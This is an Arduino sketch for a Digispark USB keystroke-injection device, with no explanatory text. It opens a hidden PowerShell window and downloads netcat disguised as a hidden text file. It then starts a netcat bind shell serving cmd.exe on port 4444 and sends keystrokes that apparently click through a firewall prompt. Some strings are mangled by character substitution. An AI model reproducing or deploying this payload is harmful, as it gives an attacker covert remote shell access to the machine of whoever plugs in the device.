#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
#define KEY_ARROW_LEFT 0x50
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadFile(@http:/nc.exe@,@$env:UserProfile<desktop<nc.txt@)");
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("(attrib +h $env:UserProfile<desktop<nc.txt)");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(Rename-Item $env:UserProfile<desktop<nc.txt nc.exe)");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd $env:UserProfile<desktop");
  DigiKeyboard.delay(500);
  DigiKeyboard.println(".<nc.exe -lp 4444 -e cmd.exe");
  DigiKeyboard.delay(1300);
  DigiKeyboard.sendKeyPress(KEY_TAB , MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyPress(0,0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(50);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
